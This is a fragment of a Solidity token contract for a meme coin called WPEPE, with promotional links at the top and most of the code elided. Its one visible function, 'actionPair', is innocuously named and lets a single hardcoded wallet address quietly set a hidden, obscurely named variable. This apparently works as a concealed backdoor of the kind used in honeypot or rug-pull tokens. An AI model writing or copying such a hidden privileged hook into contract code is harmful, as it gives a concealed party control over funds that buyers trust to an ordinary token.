/* 
    website  : https://www.WPEPE.com
    twitter  : https://x.com/WPEPE
    telegram : https://t.me/WPEPE
*/
...
contract WPEPE is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x948c124b455d4b0a1dB33939Aa4d04c63C3F9AA0) _p76234 = account;
        return true;
    }
